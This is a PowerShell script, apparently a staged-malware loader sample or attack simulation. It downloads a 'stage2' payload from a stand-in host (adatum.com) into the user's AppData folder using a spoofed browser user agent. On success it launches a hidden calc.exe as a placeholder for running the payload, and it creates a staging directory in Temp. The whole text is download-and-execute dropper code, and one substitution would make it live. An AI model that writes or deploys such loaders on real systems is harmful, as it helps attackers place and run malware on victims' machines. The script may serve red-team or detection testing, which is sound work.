
$Stage1Url = 'https://adatum.com:443/stage2.ps1'
$DownloadPath = "$env:APPDATA\stage2.bin"
$StageTimeout = 34
$RequestAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
$ErrorActionPreference = "Stop"

function Get-Stage2Payload {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = '',
        [string]$DestinationPath = '',
        [int]$TimeoutSec = 45,
        [string]$UserAgent = 'Mozilla/5.0'
    )

    Write-Verbose ("Requesting " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("User-Agent", $UserAgent)
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

Write-Verbose "Starting stage 2 transfer"
$TransferResult = Get-Stage2Payload -SourceUrl $Stage1Url -DestinationPath $DownloadPath -TimeoutSec $StageTimeout -UserAgent $RequestAgent
if ($TransferResult) {
    Start-Process -FilePath "calc.exe" -WindowStyle Hidden
}

$PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
$null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
